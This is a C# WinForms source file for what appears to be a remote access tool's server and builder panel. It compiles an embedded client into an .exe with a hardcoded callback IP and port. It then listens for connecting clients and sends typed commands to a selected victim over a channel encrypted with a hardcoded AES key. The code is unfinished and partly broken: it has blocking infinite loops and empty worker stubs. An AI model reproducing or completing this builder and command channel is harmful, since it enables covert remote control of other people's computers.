using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PR0T0TYP3
{
	public partial class PR0T0TYP3_SERVER : Form
	{
		public string bufferincmessage { get; private set; }

		public TcpClient clientSelected { get; set; }

		public PR0T0TYP3_SERVER()
		{
			InitializeComponent();
			listenerWorker.WorkerSupportsCancellation = true;
		}

		private void tabPage2_Click(object sender, EventArgs e)
		{
			//oops...
		}

		private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
			//oops...
		}

		private void buildButton_Click(object sender, EventArgs e)
		{
			//Build an exe
			String port = portText.Text;
			String ipAddress = ipOrDns.Text;

			var assembly = Assembly.GetExecutingAssembly();

			Stream stream = assembly.GetManifestResourceStream("PR0T0TYP3.Client.txt");
			StreamReader reader = new StreamReader(stream);
			String clientCode = reader.ReadToEnd();

			saveFile.Filter = "exe files (*.exe)|.exe";
			saveFile.Title = "Save the .exe File";
			saveFile.ShowDialog();
			String fileDownName = saveFile.FileName;

			ResourceWriter resW = new ResourceWriter("temp.resources");
			resW.AddResource("port", port);
			resW.AddResource("ipAddress", ipAddress);
			resW.Generate();
			resW.Close();

			CSharpCodeProvider codeProvider = new CSharpCodeProvider();
			ICodeCompiler icc = codeProvider.CreateCompiler();

			System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
			parameters.ReferencedAssemblies.Add("System.IO.dll");
			parameters.ReferencedAssemblies.Add("System.Security.dll");
			parameters.ReferencedAssemblies.Add("System.dll");
			parameters.ReferencedAssemblies.Add("System.Net.dll");
			parameters.ReferencedAssemblies.Add("System.Linq.dll");
			parameters.ReferencedAssemblies.Add("System.Reflection.dll");
			parameters.ReferencedAssemblies.Add("System.Collections.dll");

			parameters.EmbeddedResources.Add("temp.resources");

			parameters.GenerateExecutable = true;
			parameters.OutputAssembly = fileDownName;
			CompilerResults results = icc.CompileAssemblyFromSource(parameters, clientCode); //Add stuff l8r
			if (results.Errors.Count > 0)
			{
				// Display compilation errors.
				log.Text += "Errors building file into " + results.PathToAssembly + "\n";
				foreach (CompilerError ce in results.Errors)
				{
					log.Text += ce.ToString() + "\n";
				}
			}
			else
			{
				// Display a successful compilation message.
				log.Text = "File built into " + results.PathToAssembly + " successfully.";
			}
		}

		private void portListenButton_Click(object sender, EventArgs e)
		{
			int count = 0;
			Listener listener = new Listener();
			IPAddress myIP = GetExternalIPAddress();
			IPAddress localHost = GetLocalIPAddress();

			if (!String.IsNullOrEmpty(portListenText.Text))
			{
				int portToListen = Convert.ToInt32(portListenText.Text);
				if (localBox.Checked)
				{
					listener.port = portToListen;
					listener.ip = localHost;
					listener.serverstart();
					foreach (var item in listener.addresses)
					{
						IpAddresses.Rows.Add(item, count);
						count++;
					}
					while (true)
					{
						int selected = IpAddresses.SelectedRows[0].Index;
						clientSelected = listener.list_clients[selected];
					}
				}
				else
				{
					listener.port = portToListen;
					listener.ip = myIP;
					listener.serverstart();
					foreach (var item in listener.addresses)
					{
						IpAddresses.Rows.Add(item, count);
						count++;
					}
					while (true)
					{
						int selected = IpAddresses.SelectedRows[0].Index;
						clientSelected = listener.list_clients[selected];
					}
				}
			}
		}

		public static String DownloadData(TcpClient curClient)
		{
			String dataS = "";
			while (true)
			{
				byte[] data = new byte[4096];
				NetworkStream stream = curClient.GetStream();
				int byteCount = stream.Read(data, 0, data.Length);

				if (byteCount == 0)
				{
					break;
				}

				dataS = decrypt(data);
			}
			if (!String.IsNullOrEmpty(dataS))
				return dataS;
			else
				return null;
		}

		public static IPAddress GetLocalIPAddress()
		{
			var host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (var ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip;
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		public static byte[] stringToByteArray(String hex)
		{
			int hexLength = hex.Length;
			byte[] bytes = new byte[hexLength / 2];
			for (int i = 0; i < hexLength; i += 2)
				bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			return bytes;
		}

		public static byte[] encrypt(String someString)
		{
			byte[] encrypted;

			byte[] IV;

			Aes theAes = Aes.Create();

			theAes.GenerateIV();

			IV = theAes.IV;

			theAes.Mode = CipherMode.CBC;

			theAes.Key = stringToByteArray("dd0ecb45c37b2fa02f7d924de0e48301"); //You may replace this key with any AES 128-bit key

			someString = someString.PadLeft(128);

			var encryptor = theAes.CreateEncryptor(theAes.Key, theAes.IV);

			using (var mem = new MemoryStream())
			{
				using (var crypto = new CryptoStream(mem, encryptor, CryptoStreamMode.Write))
				{
					using (var sWriter = new StreamWriter(crypto))
					{
						sWriter.Write(someString);
					}
					encrypted = mem.ToArray();
				}
			}

			var combinedIvCt = new byte[IV.Length + encrypted.Length];
			Array.Copy(IV, 0, combinedIvCt, 0, IV.Length);
			Array.Copy(encrypted, 0, combinedIvCt, IV.Length, encrypted.Length);

			return combinedIvCt;
		}

		public static string decrypt(byte[] somethingElse)
		{
			using (Aes aesAlg = Aes.Create())
			{
				string decrypted;

				aesAlg.Key = stringToByteArray("dd0ecb45c37b2fa02f7d924de0e48301"); //You may replace this key with any AES 128-bit key

				byte[] IV = new byte[aesAlg.BlockSize / 8];
				byte[] cipherText = new byte[somethingElse.Length - IV.Length];

				Array.Copy(somethingElse, IV, IV.Length);
				Array.Copy(somethingElse, IV.Length, cipherText, 0, cipherText.Length);

				aesAlg.IV = IV;

				aesAlg.Mode = CipherMode.CBC;

				ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

				using (var msDecrypt = new MemoryStream(cipherText))
				{
					using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
					{
						using (var srDecrypt = new StreamReader(csDecrypt))
						{
							decrypted = srDecrypt.ReadToEnd();
						}
					}
				}
				return decrypted;
			}
		}

		private IPAddress GetExternalIPAddress()
		{
			try
			{
				String externalIP;
				externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
				externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
							 .Matches(externalIP)[0].ToString();
				return IPAddress.Parse(externalIP);
			}
			catch { return null; }
		}


		private bool IsPrivateIP(IPAddress myIPAddress)
		{
			if (myIPAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
			{
				byte[] ipBytes = myIPAddress.GetAddressBytes();

				// 10.0.0.0/24 
				if (ipBytes[0] == 10)
				{
					return true;
				}
				// 172.16.0.0/16
				else if (ipBytes[0] == 172 && ipBytes[1] == 16)
				{
					return true;
				}
				// 192.168.0.0/16
				else if (ipBytes[0] == 192 && ipBytes[1] == 168)
				{
					return true;
				}
				// 169.254.0.0/16
				else if (ipBytes[0] == 169 && ipBytes[1] == 254)
				{
					return true;
				}
			}

			return false;
		}


		private bool CompareIpAddress(IPAddress IPAddress1, IPAddress IPAddress2)
		{
			byte[] b1 = IPAddress1.GetAddressBytes();
			byte[] b2 = IPAddress2.GetAddressBytes();

			if (b1.Length == b2.Length)
			{
				for (int i = 0; i < b1.Length; ++i)
				{
					if (b1[i] != b2[i])
					{
						return false;
					}
				}
			}
			else
			{
				return false;
			}

			return true;
		}

		private void cmdButton_Click(object sender, EventArgs e)
		{
			try
			{
				byte[] command = Encoding.ASCII.GetBytes(cmdInput.Text);
				NetworkStream curStream = clientSelected.GetStream();
				curStream.Write(command, 0, command.Length);
			}
			catch (Exception)
			{
				MessageBox.Show("Make sure you select a client first!");
			}
		}

		private void listenerWorker_DoWork(object sender, DoWorkEventArgs e)
		{

		}

		private void listenerWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
		{

		}

		private void listenerWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
		{

		}

		private void stopIt_Click(object sender, EventArgs e)
		{
			listenerWorker.CancelAsync();
		}
	}
}
